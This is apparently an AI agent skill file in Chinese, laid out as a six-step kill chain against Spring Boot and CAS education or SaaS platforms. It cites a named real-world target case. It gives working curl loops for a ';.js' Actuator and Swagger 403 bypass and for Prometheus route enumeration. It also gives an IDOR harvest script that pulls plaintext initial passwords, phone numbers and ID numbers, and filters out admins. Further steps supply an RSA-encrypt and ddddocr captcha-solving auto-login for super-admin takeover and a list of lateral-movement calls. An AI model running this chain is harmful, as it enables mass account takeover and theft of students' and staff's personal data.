---
name: spring-cas-initpwd-ato
description: >-
  Spring Boot + CAS 教育/SaaS 平台渗透链：`;.js` Actuator/Swagger 403 绕过 →
  Prometheus 全量路由枚举 → 学生票越权 admin API（initPassword IDOR）→
  RSA 公钥提取+ddddocr 验证码自动识别→超管 ATO→微服务横向。
  适用于 CAS 单点登录 + Spring Cloud 微服务 + 分角色 RBAC 的教育/医疗/SaaS 平台。
  用户提到 CAS ticket、initPassword、`;.js` 绕过、Prometheus 路由发现、
  RSA 前端加密登录、教育平台、乐课、letao、施强、Spring Actuator 路由枚举时使用。
---

# Spring CAS + initPassword ATO 杀伤链

## 何时用

- 目标是 **CAS 单点登录 + Spring Cloud 微服务** 架构（教育/医疗/SaaS）
- 看到 `/actuator` 被 403 但 `;.js` 能绕
- Prometheus 里发现 `/auth/admin/` 类端点
- 用户列表返回 `initPassword`（明文初始密码）字段
- 前端 JS 里有 RSA 公钥、CAPTCHA uuid 参数
- 多个微服务共享 CAS ticket 但 RBAC 各自独立

## 来源案例

育财师通(yucaishitong.com)案——`exports/bot-recovery/yucaishitong/测绘/yucaishitong总报告.md`

---

## 杀伤链（6 步）

```
① ;.js 绕过 403 → Actuator/Swagger 暴露
② Prometheus 指标 → 全量 HTTP 路由 + Dubbo 接口蓝图
③ 低权票越权高权端点 → 拉到 initPassword（明文初始密码）
④ 逆向前端 JS → RSA 公钥 + 验证码参数 + 正确登录端点
⑤ RSA 加密 + ddddocr → 自动化登录超管
⑥ 超管横向 → 微服务扫描 / 工单 / bigDataProxy / 导出
```

---

## 步骤 1：`;.js` 路径绕过 403

Spring Security 对 `/actuator` 返回 403，但 Tomcat 对 URL 中的 `;` 做路径参数截断。
`;.js` 让 Spring Security 以为是静态资源放行，Tomcat 截断后仍路由到 Actuator。

**探测命令：**
```bash
# Actuator
for svc in letao-user-center letao-org-center letao-work-order; do
  curl -sk "https://目标/${svc}/actuator;.js" | head -c 200
  echo ""
done

# Swagger
for sub in wrongtopic homework im chat log monitor; do
  curl -sk "https://${sub}.目标域/v2/api-docs;.js" | head -c 200
  echo ""
done
```

**判定：**
- 返回 JSON `_links` → Actuator 活，继续打 `/actuator;.js/prometheus`
- 返回 Swagger JSON → 全量端点蓝图，grep `admin|inner|export|order|user`

**适用条件：** Spring Boot 1.x~2.x + Tomcat（Undertow 不吃 `;`）。3.x 默认只暴露 health。

---

## 步骤 2：Prometheus 全量路由枚举

```bash
curl -sk "https://目标/微服务名/actuator;.js/prometheus" -o metrics.txt

# 提取所有 HTTP URI
grep -oP 'uri="[^"]+"' metrics.txt | sort -u

# 筛选高价值端点
grep -oP 'uri="[^"]+"' metrics.txt | grep -iE 'admin|inner|export|order|user|center|list|query|role'
```

**重点关注：**
- `/auth/admin/` 前缀 → 管理端点（可能低权票能调）
- `/inner/` 前缀 → 微服务内部端点（本应不可达）
- Dubbo 接口的 `method` 计数 → 高频方法是核心业务

---

## 步骤 3：低权票越权 admin 端点（initPassword IDOR）

**原理：** CAS 架构里，所有角色共用一套 ticket。如果 admin 端点只校验 ticket 有效性、不校验角色，任何已登录用户都能调。

**探测：**
```bash
# 用学生/普通用户 ticket 调 admin 端点
curl -sk "https://目标/user-center/auth/admin/center/list?ticket=${TICKET}" \
  -H "Content-Type: application/json" \
  -d '{"curPage":1,"pageSize":10}'
```

**成功标志：** 返回 `"success":true` + 用户列表，且包含 `initPassword` 字段。

**收割：**
```python
# 翻页拉全量
for page in range(1, total_pages + 1):
    resp = session.post(url, json={"curPage": page, "pageSize": 50}, params={"ticket": ticket})
    users.extend(resp.json()["data"]["dataList"])

# 筛选有密码的
with_pwd = [u for u in users if u.get("initPassword")]
# 筛选管理员
admins = [u for u in with_pwd if any(kw in u["username"] for kw in ["管理", "admin", "超级"])]
```

**关键字段矩阵：**

| 字段 | 泄露风险 | 利用方式 |
|------|---------|---------|
| `initPassword` | 极高 | 直接登录（如未改密） |
| `mobile` | 极高 | 身份定位 + 密码重置 |
| `loginName` | 中 | 登录标识（乐号/工号） |
| `email` | 高 | 密码重置 |
| `identityNo` | 极高 | 身份证号 |

---

## 步骤 4：逆向前端 JS 提取登录参数

管理后台的登录流程通常在前端 JS bundle 里。

**提取三要素：**

```bash
# 1. 下载主 JS bundle
curl -sk "https://目标/" | grep -oP 'src="[^"]*\.js"' | head -5
# 下载最大的那个

# 2. 搜 RSA 公钥
grep -oP 'MIGfMA0GCSqGSIb3[A-Za-z0-9+/=]+' bundle.js

# 3. 搜验证码参数名
grep -oP 'getAuthCode|getCaptcha|getVerifyCode' bundle.js
# 看调用上下文：参数是 uuid（时间戳）还是 identifyKey 还是 key

# 4. 搜登录端点
grep -oP '/[a-z-]+/login|/unauth/[a-z]+/login|/auth/login' bundle.js

# 5. 搜 Authorization 头格式
grep -oP "Authorization.*Bearer|authorization.*token" bundle.js
# 有的系统不带 Bearer 前缀！
```

**常见坑：**
- 登录端点可能有多个（`/unauth/account/login` 要 platformType，`/login` 不要）
- Authorization 头有的系统直接传 JWT 裸串（不加 `Bearer `），加了反而 401
- 验证码参数名不是 `key` 而是 `uuid`（毫秒时间戳）

---

## 步骤 5：RSA 加密 + ddddocr 自动登录

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64, time, requests, ddddocr

PUBKEY = "MIGfMA0GCSqGSIb3DQEB..."  # 步骤 4 提取
ocr = ddddocr.DdddOcr(show_ad=False)

def auto_login(base_url, login_name, password, max_retry=5):
    s = requests.Session()
    s.verify = False
    
    for _ in range(max_retry):
        # 获取验证码
        uuid_val = str(int(time.time() * 1000))
        img = s.get(f"{base_url}/getAuthCode", params={"uuid": uuid_val}).content
        if len(img) < 100:
            continue
        code = ocr.classification(img)
        
        # RSA 加密密码
        key = RSA.import_key(base64.b64decode(PUBKEY))
        enc_pwd = base64.b64encode(
            PKCS1_v1_5.new(key).encrypt(password.encode())
        ).decode()
        
        # 登录
        resp = s.post(f"{base_url}/login", json={
            "loginName": login_name,
            "password": enc_pwd,
            "checkAuthCode": True,
            "authCode": code,
            "uuid": uuid_val,
        }).json()
        
        if resp.get("code") == 200:
            token = resp["data"]["tokenInfo"]["accessToken"]
            return token
        elif "验证码" in resp.get("message", ""):
            continue  # OCR 识别错，重试
        else:
            return None  # 密码错误，不重试
    return None
```

**ddddocr 识别率：** 4 位字母数字约 60%，5 次重试基本能过。纯数字 4 位接近 90%。

---

## 步骤 6：超管横向扫描

拿到超管 JWT 后的标准动作清单：

```python
headers = {"Authorization": token}  # 注意：可能不带 Bearer

# 1. 确认身份
GET /auth/user/info

# 2. 全量用户管理
POST /auth/admin/center/list  {"curPage":1,"pageSize":50,"username":"关键词"}

# 3. 角色列表
GET /auth/personal/getUserRoleList
GET /auth/admin/role/list

# 4. 组织架构
GET /auth/currentOrgUser/get
GET /auth/admin/org/getOrgTree

# 5. CAS ticket 换取（打其他子系统）
GET /auth/transfer/getWebTicket  → 用 ticket 访问 mall/course/crm

# 6. 微服务扫描（逐个打 Prometheus，找路由）
for svc in ["org-center", "work-order", "teach-quality", "edu-center",
            "workbench-center", "msg-center", "app-center"]:
    GET /{svc}/actuator;.js/prometheus

# 7. bigDataProxy 通配路由（如果存在）
POST /teach-quality/auth/bigDataProxy/queryData/order/list  {}
# 返回 200 + data=null → 后端死；返回数据 → 金矿

# 8. 导出接口
POST /auth/admin/center/exportUserExcel  {}
GET  /auth/admin/orgSchool/export

# 9. 内部接口（/inner/ 前缀，可能无认证）
POST /inner/letao/guc/userQuery  {"userId": 1}
GET  /inner/free/login/getTokenByHealthToken?healthToken=xxx
```

---

## 关键认知（踩坑总结）

### 1. CAS 共享认证 ≠ 共享权限
CAS ticket 全域通用，但每个子系统的 RBAC 独立。超管在用户中心有最高权限，在商城可能是 403。

### 2. initPassword 是批量 ATO 金矿
很多系统给用户分配初始密码后不强制修改。泄露 initPassword = 批量接管。测试账号改密率低。

### 3. Prometheus 比 Swagger 更稳
Swagger 经常被关，Prometheus 经常被忘。而且 Prometheus 带调用次数——0 次的方法是休眠面（可能无人测过），高频方法是核心业务。

### 4. `/inner/` 端点外网可达
微服务间 Dubbo/Feign 调用的 HTTP 端点，如果网关没拦 `/inner/` 前缀，外网直接调无认证。

### 5. 验证码参数名要从 JS 里搜
不要猜 `key`/`identifyKey`，直接搜 `getAuthCode`/`getCaptcha` 的调用上下文。常见变体：`uuid`(时间戳)、`key`(随机串)、`token`(会话绑定)。

### 6. Authorization 头格式不统一
有的系统 `Bearer xxx`，有的直接 `xxx`（不带 Bearer），有的 `Token xxx`。加错前缀会 401。从 JS 里 `grep Authorization` 确认。

### 7. 微服务命名规律
`{前缀}-user-center`、`{前缀}-order`、`{前缀}-mall`、`{前缀}-finance`、`{前缀}-work-order`。知道一个就能猜全家。

---

## 工具依赖

```
pip install pycryptodome ddddocr requests
```

## 相关 Skill

- `spring-gateway-actuator-killchain` — Actuator heapdump 全链（本卡侧重 initPassword ATO）
- `heapdump-credential-hunter` — 堆内存凭证提取
- `401-403-bypass-techniques` — 更多绕过姿势
- `account-takeover-chain` — 通用 ATO 链
